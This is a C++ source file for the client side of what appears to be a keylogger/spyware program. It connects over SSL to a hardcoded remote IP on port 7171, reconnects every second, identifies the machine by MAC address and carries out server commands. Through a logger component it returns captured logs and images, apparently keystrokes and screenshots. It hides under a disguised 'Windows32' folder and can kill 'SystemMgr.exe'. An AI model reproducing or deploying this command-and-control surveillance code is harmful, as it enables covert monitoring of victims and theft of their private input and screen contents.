#include "Client.hpp"
#include <tlhelp32.h>
#include <iphlpapi.h>
#include <thread>
#include <Shlobj.h>
#include <Shellapi.h>
#include "LoggerHandler.hpp"

#pragma comment(lib, "iphlpapi.lib")

# define IP "89.3.203.173"

size_t Client::ReDialTime = 1;

Client::Client() : _ctx(boost::asio::ssl::context::sslv23), _logger(new LoggerHandler), _SSLHandler(boost::make_shared<SSLConnection>(_io, _ctx)), _waitingToSend(false)
{
	try {
		std::string certifPath;
		WCHAR path[256];
		if (SUCCEEDED(SHGetFolderPathW(NULL, CSIDL_PROGRAM_FILESX86, NULL, 0, path))) {
			std::wstring pfiles(path);
			certifPath = std::string(pfiles.begin(), pfiles.end()) + "\\Windows32\\rootCA.pem";
		}
		_ctx.load_verify_file(certifPath);
	}
	catch (std::exception &e) {
		throw e;
	}
	std::thread logThread(&Client::startAll, this);
	_SSLHandler->getSSLSocket().set_verify_mode(boost::asio::ssl::verify_peer);
	_MAC = GetMACaddress();
	boost::asio::ip::tcp::resolver resolver(_io);
	boost::asio::ip::tcp::resolver::query query(IP, "7171");
	_endpoint = resolver.resolve(query);

	_logger->hookClient(this);
	_SSLHandler->getSSLSocket().set_verify_callback(
		boost::bind(&Client::verify_certificate, this, _1, _2));
	_interpreter.hookClient(this);
	connect();
	_io.run();
}

Client::~Client()
{
	if (_logger)
		delete _logger;
}

void Client::connect()
{
	MACPacket.clear();
	boost::asio::async_connect(_SSLHandler->getSocket(), _endpoint,
		boost::bind(&Client::connectCallback, this,
					boost::asio::placeholders::error)
	);
}

void Client::connectCallback(const boost::system::error_code& error)
{
	if (!error)
		_SSLHandler->handShake(boost::bind(&Client::handshakeCallback, this, boost::asio::placeholders::error));
	else
	{
		_SSLHandler.reset(new SSLConnection(_io, _ctx));
		boost::shared_ptr<boost::asio::deadline_timer> _timer(new boost::asio::deadline_timer(_io, boost::posix_time::seconds(Client::ReDialTime)));
		_timer->async_wait(boost::bind(&Client::tryReconnect, this, boost::asio::placeholders::error, _timer));
	}
}

void Client::tryReconnect(const boost::system::error_code &error, const boost::shared_ptr<boost::asio::deadline_timer>& _timer)
{
	connect();
}

bool Client::verify_certificate(bool preverified,
	boost::asio::ssl::verify_context& ctx)
{
	return preverified;
}

void Client::handshakeCallback(const boost::system::error_code& error)
{
	if (!error)
	{
		_logger->writeStatus(true);
		MACPacket.setPacketType(Packet::IDENTIFY);
		MACPacket << _MAC;
		_SSLHandler->write(MACPacket, boost::bind(&Client::writeCallback, this, boost::asio::placeholders::error));
	}
	else
		connect();
}

void Client::readCallback(const boost::system::error_code &error)
{
	if (_waitingToSend)
	{
		_waitingToSend = false;
		_logger->writeStatus(false);
		_SSLHandler->write(OUTBOUNDPacket, boost::bind(&Client::writeCallback, this, boost::asio::placeholders::error));
	}
	else if (!error)
	{
		PINGPacket.clear();
		PINGPacket = INBOUNDPacket;
		INBOUNDPacket.clear();
		_SSLHandler->read(INBOUNDPacket, boost::bind(&Client::readCallback, this, boost::asio::placeholders::error));
		_interpreter.handleCommand(PINGPacket);
	}
	else
	{
		if (_logger->_connectStatus)
		{
			_SSLHandler.reset(new SSLConnection(_io, _ctx));
			_logger->writeStatus(false);
			connect();
			_io.run();
		}
	}
}

void Client::writeCallback(const boost::system::error_code& error)
{
	_waitingToSend = false;
	OUTBOUNDPacket.clear();
	if (error)
		_logger->writeStatus(false);
	else
		_logger->writeStatus(true);
	INBOUNDPacket.clear();
	_SSLHandler->read(INBOUNDPacket, boost::bind(&Client::readCallback, this, boost::asio::placeholders::error));


}

void Client::moveOn(bool status)
{
	OUTBOUNDPacket.clear();
	_logger->writeStatus(status);
}

void Client::log(const Packet::PacketType &type)
{
	if (type == Packet::LOG)
		_logger->getLog();
	else if (type == Packet::IMG)
		_logger->getImg();
}

void Client::stopSession()
{
	HANDLE processSnap = CreateToolhelp32Snapshot(TH32CS_SNAPALL, 0);
	PROCESSENTRY32 process = { 0 };
	process.dwSize = sizeof(process);
	Process32First(processSnap, &process);
	if (!Process32First(processSnap, &process))
		return;
	do
	{
		int tmp = _tcsicmp(process.szExeFile, "SystemMgr.exe");
		if (tmp == 0)
		{
			HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, process.th32ProcessID);
			TerminateProcess(hProcess, 0);
			CloseHandle(hProcess);
		}
	} while (Process32Next(processSnap, &process));
	CloseHandle(processSnap);
}

void Client::uninstall()
{
	std::string execPath = "";
	WCHAR path[256];
	if (SUCCEEDED(SHGetFolderPathW(NULL, CSIDL_PROGRAM_FILESX86, NULL, 0, path))) {
		std::wstring pfiles(path);
		std::string tmp(pfiles.begin(), pfiles.end());
		execPath = tmp + "\\Windows32\\Uninstaller.exe";
	}
	std::cout << execPath << std::endl;

	ShellExecute(NULL,
		"runas",
		execPath.c_str(),
		NULL,
		NULL,
		SW_SHOWNORMAL
	);

}

std::string Client::GetMACaddress(void)
{
	std::stringstream stream;
	IP_ADAPTER_INFO AdapterInfo[16];
	DWORD dwBufLen = sizeof(AdapterInfo);
	DWORD dwStatus = GetAdaptersInfo(AdapterInfo, &dwBufLen);
	PIP_ADAPTER_INFO pAdapterInfo = AdapterInfo;
	if (dwStatus != ERROR_SUCCESS)
		return "00:00:00:00:00:00";
	for (int i = 0; i < 6; i++)
	{
		stream << std::setfill('0') << std::setw(2) << std::hex << static_cast<int>(pAdapterInfo->Address[i]);
		if (i != 5)
			stream << ":";
	}
	return stream.str();
}

void startServering()
{
	try {
		Client client;
	}
	catch (std::exception& e) {
		std::cerr << e.what() << std::endl;
	}
}

void		Client::startAll()
{
	MSG				msg;

	_logger->startLog();
	GetMessage(&msg, NULL, 0, 0);
	while (WM_QUIT != msg.message)
	{
		if (PeekMessage(&msg, NULL, 0, 0, PM_NOREMOVE) > 0)
		{
			GetMessage(&msg, NULL, 0, 0);
		}
	}
}
